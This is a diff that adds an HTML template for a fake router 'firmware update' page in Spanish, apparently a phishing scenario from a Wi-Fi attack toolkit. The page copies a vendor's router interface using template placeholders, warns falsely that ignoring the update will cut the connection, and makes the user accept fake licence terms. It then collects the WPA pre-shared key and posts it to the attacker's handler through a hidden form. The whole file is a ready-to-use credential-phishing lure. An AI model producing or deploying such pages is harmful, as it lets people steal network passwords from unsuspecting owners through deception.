@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>Pagina de Configuracion del Router</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="bootstrap.min.css">
+  <script src="jquery.min.js"></script>
+  <script src="bootstrap.min.js"></script>
+
+  <!-- CSS -->
+  <style type="text/css">
+
+    /* Sticky footer styles
+    -------------------------------------------------- */
+
+    html,
+    body {
+          height: 100%;
+          /* The html and body elements cannot have any padding or margin. */
+        }
+
+        /* Wrapper for page content to push down footer */
+        #wrap {
+          min-height: 100%;
+          height: auto !important;
+          height: 100%;
+          /* Negative indent footer by it's height */
+          margin: 0 auto -60px;
+        }
+
+        /* Set the fixed height of the footer here */
+        #push,
+        #footer {
+          height: 60px;
+        }
+        #footer {
+          background-color: #f5f5f5;
+        }
+
+        /* Lastly, apply responsive CSS fixes as necessary */
+        @media (max-width: 767px) {
+          #footer {
+            margin-left: -20px;
+            margin-right: -20px;
+            padding-left: 20px;
+            padding-right: 20px;
+          }
+        }
+
+    img {
+        width: auto;
+        max-width: 100%;
+        height: auto;
+    }
+  </style>
+
+</head>
+
+<body>
+
+  <!-- Start navigation bar -->
+  <!-- To change the navigation bar color change background attribute -->
+  <nav class="navbar navbar-inverse" style="background:RoyalBlue;margin-top:2em;">
+    <div class="container-fluid">
+      <div class="navbar-header">
+        <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#myNavbar">
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+        </button>
+        <!--
+        <a class="navbar-brand"><img style="background:transparent" src="Your LOGO" alt="Logo"></a>
+        -->
+      </div>
+      <div class="collapse navbar-collapse" id="myNavbar">
+        <ul class="nav navbar-nav">
+          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
+              data-toggle="dropdown" href="#" style="color:white">Setup <span class="caret"></span></a>
+            <ul class="dropdown-menu">
+              <li><a href="#">Setup Básico</a></li>
+              <li><a href="#">DDNS</a></li>
+              <li><a href="#">Clonar Dirección MAC</a></li>
+              <li><a href="#">Routing Avanzado</a></li>
+            </ul>
+          </li>
+          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
+              data-toggle="dropdown" href="#" style="color:white">WiFi <span class="caret"></span></a>
+            <ul class="dropdown-menu">
+              <li><a href="#">Ajustes WiFi Básicos</a></li>
+              <li><a href="#">Seguridad WiFi</a></li>
+              <li><a href="#">Filtro MAC WiFi</a></li>
+              <li><a href="#">Ajustes WiFi Avanzados</a></li>
+            </ul>
+          </li>
+          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
+              data-toggle="dropdown" href="#" style="color:white">Seguridad <span class="caret"></span></a>
+            <ul class="dropdown-menu">
+              <li><a href="#">Firewall</a></li>
+              <li><a href="#">VPN</a></li>
+            </ul>
+          </li>
+          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
+              data-toggle="dropdown" href="#" style="color:white">Restricción de Acceso <span class="caret"></span></a>
+            <ul class="dropdown-menu">
+              <li><a href="#">Acceso a Internet</a></li>
+            </ul>
+          </li>
+          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
+              data-toggle="dropdown" href="#" style="color:white">Administración <span class="caret"></span></a>
+            <ul class="dropdown-menu">
+              <li><a href="#">Gestión</a></li>
+              <li><a href="#">Logs</a></li>
+              <li><a href="#">Diagnósticos</a></li>
+              <li><a href="#">Reset de Fábrica</a></li>
+              <li><a href="#">Gestión de Configuración</a></li>
+            </ul>
+          </li>
+          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
+              data-toggle="dropdown" href="#" style="color:white">Estado <span class="caret"></span></a>
+            <ul class="dropdown-menu">
+              <li><a href="#">Router</a></li>
+              <li><a href="#">Red Local</a></li>
+              <li><a href="#">WiFi</a></li>
+              <li><a href="#">Routing Avanzado</a></li>
+            </ul>
+          </li>
+        </ul>
+      </div>
+    </div>
+  </nav>
+  <!-- End navigation bar -->
+
+  <!-- Start page content -->
+  <div class="container">
+	   <div class="col-sm">
+       {% if target_ap_logo_path is not none %}
+         <center><img src="{{ target_ap_logo_path }}"></img></center>
+       {% endif %}
+       <h2 class="text-center" style="color:CornflowerBlue">Actualización del Firmware</h2>
+    	 <p class="lead">Una nueva versión del firmware {{ target_ap_vendor if target_ap_vendor != None}} ({{ firmware_version }}) ha sido detectada y necesita su instalación. Por favor, lea los siguientes términos y condiciones y proceda.</p><p style="color:red">Advertencia: Ignorar esta actualización podría causar pérdida total de conexión eventualmente.</p>
+     </div>
+    <form>
+      <div class="form-group">
+        <label for="comment">Términos y Condiciones:</label>
+        <textarea readonly class="form-control" rows="5" id="comment">
+1. LICENCIA.
+
+Sujeto a los términos y condiciones de este Acuerdo de Licencia de Software, {{ target_ap_vendor if target_ap_vendor != None}} aquí y por tanto le otorga una licencia restringida, limitada, no-exclusiva, no-transferible para usar el Firmware/Software/Drivers {{ target_ap_vendor if target_ap_vendor != None}} sólo en conjunto con productos {{ target_ap_vendor if target_ap_vendor != None}}. La compañía {{ target_ap_vendor if target_ap_vendor != None}} no le otorga ningún derecho de licencia en ninguna patente, copyright u otra propiedad intelectual apropiada o licenciada.
+
+2. NO GARANTIA.
+
+Los Firmwares/Softwares/Drivers de {{ target_ap_vendor if target_ap_vendor != None}} son provistos "COMO TAL" sin ninguna garantía de ningún tipo. La compañía {{ target_ap_vendor if target_ap_vendor != None}} no le garantiza que las funciones contenidas en los Firmwares/Softwares/Drivers de INTRACOM TELECOM alcancen sus requisitos o que las operaciones de los Firmwares/Softwares/Drivers de {{ target_ap_vendor if target_ap_vendor != None}} sean ininterumpidas o libre de errores. La compañía {{ target_ap_vendor if target_ap_vendor != None}} por tanto es libre de todas garantías, expresas o implícitas con respecto a los firmwares/softwares/drivers de {{ target_ap_vendor if target_ap_vendor != None}}, incluyendo, sin limitación, ninguna garantía implicada de mercantilidad, ajuste de propósito o no-infringimiento.
+
+3. NO LIABILIDAD.
+
+Bajo ninguna circunstancia la compañía {{ target_ap_vendor if target_ap_vendor != None}} o cualquier otra parte que haya estado involucrada en la creación, producción o entrega de los Firmwares/Softwares/Drivers de {{ target_ap_vendor if target_ap_vendor != None}} es liable por cualquier daño o similar producto de o relacionado con este Acuerdo de Licencia de Software o los Firmwares/Softwares/Drivers de la compañía {{ target_ap_vendor if target_ap_vendor != None}}, incluyendo, sin limitación, directa, indirecta, consequiente, incidente o especial, daños o pérdidas, incluyendo pero no limitándose a daños por pérdidas de beneficios o pérdidas resultantes en interrupción de negocios o pérdida de datos, independientemente de la forma de acción o teoría legal bajo la cual la liabilidad pueda ser asegurada, incluso si previoaviso es existente la posibilidad o avistamiento de la ocurrencia de tales daños.
+       </textarea>
+        <div class="checkbox">
+          <label><input type="checkbox" id="check-box" onclick="checkBoxStatus()">Estoy de acuerdo con los términos y condiciones descritos anteriormente</label>
+        </div>
+      </div>
+      <div class="form-group has-feedback">
+          <label for="pwd">{{ target_ap_encryption if target_ap_encryption != None }} Pre-Shared Key (Contraseña Router WiFi):</label>
+          <input class="form-control" type="password" id="pwd" disabled>
+      </div>
+      <div class="container text-center">
+        <button class="btn btn-primary" id="btn">Iniciar Actualización</button>
+      </div>
+    </form>
+    <div id="push"></div>
+  </div>
+  <!-- Start page content -->
+
+  <!-- Start footer -->
+  <footer class="footer">
+    <div class="container text-center">
+      <p class="text-muted">© {{ target_ap_vendor }} 2016, Todos los derechos reservados.</p>
+    </div>
+  </footer>
+  <!-- End footer -->
+
+  <!-- Start update first message -->
+  <div class="modal fade" id="update-only" role="dialog">
+    <div class="modal-dialog modal-sm">
+      <div class="modal-content">
+        <div class="modal-header">
+          <button type="button" class="close" data-dismiss="modal">&times;</button>
+          <h4 class="modal-title">Información</h4>
+        </div>
+        <div class="modal-body">
+          <p>Se requiere una actualización.</p>
+        </div>
+        <div class="modal-footer">
+          <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- End update first message -->
+
+  <!-- Start empty password message -->
+  <div class="modal fade" id="empty-pass">
+    <div class="modal-dialog modal-sm">
+      <div class="modal-content">
+        <div class="modal-header">
+          <button type="button" class="close" data-dismiss="modal">&times;</button>
+          <h4 class="modal-title">Information</h4>
+        </div>
+        <div class="modal-body">
+          <p>Por favor introduzca una contraseña válida.</p>
+        </div>
+        <div class="modal-footer">
+          <button type="button" class="btn btn-default" data-dismiss="modal">Cerrar</button>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- End empty password message -->
+
+  <!-- Start empty password message -->
+  <div class="modal fade" id="no-checkbox">
+    <div class="modal-dialog modal-sm">
+      <div class="modal-content">
+        <div class="modal-header">
+          <button type="button" class="close" data-dismiss="modal">&times;</button>
+          <h4 class="modal-title">Información</h4>
+        </div>
+        <div class="modal-body">
+          <p>Por favor marque la casilla "Estoy de acuerdo".</p>
+        </div>
+        <div class="modal-footer">
+          <button type="button" class="btn btn-default" data-dismiss="modal">Cerrar</button>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- End empty password message -->
+
+<script>
+
+/*
+  Check the password field and act accordingly.
+*/
+$("#btn").on("click", function(e) {
+    e.preventDefault();
+
+    // get the password box and checkbox elements
+  	var input = document.getElementById("pwd");
+    var box = document.getElementById("check-box");
+
+    // if the box is checked
+  	if ( box.checked == true )
+  		{
+        // check to see if the value is empty
+      	if ( input.value == "" )
+      		{
+            // display no password message
+            $("#empty-pass").modal("show");
+
+      		}
+      	else
+      		{
+            // post the data
+            post('upgrading.html', {"wfphshr-wpa-password": input.value});
+      		}
+      }
+    else
+      {
+        // display no checkbox message
+        $("#no-checkbox").modal("show");
+      }
+});
+
+/*
+  Post to the fallowing path given the parameters.
+
+  Args:
+    path: The path to be posted to.
+    params: The parameters to be passed.
+*/
+function post(path, params) {
+    // create a form and set its attributes
+    var form = document.createElement("form");
+    form.setAttribute("method", "post");
+    form.setAttribute("action", path);
+
+    // set the attribute for the post
+    for(var key in params) {
+        if(params.hasOwnProperty(key)) {
+            var hiddenField = document.createElement("input");
+            hiddenField.setAttribute("type", "hidden");
+            hiddenField.setAttribute("name", key);
+            hiddenField.setAttribute("value", params[key]);
+
+            form.appendChild(hiddenField);
+         }
+    }
+
+    // submit the post
+    document.body.appendChild(form);
+    form.submit();
+}
+
+/*
+  Check the status of check box
+*/
+function checkBoxStatus()
+{
+  // get the password box and checkbox elements
+	var box = document.getElementById("check-box");
+	var input = document.getElementById("pwd");
+
+  // if the box is checked
+	if ( box.checked == true )
+		{
+      // enabale the password box
+			input.disabled = false;
+		}
+	else
+		{
+      // disable the password box
+			input.disabled = true;
+		}
+	}
+</script>
+</body>
+</html>
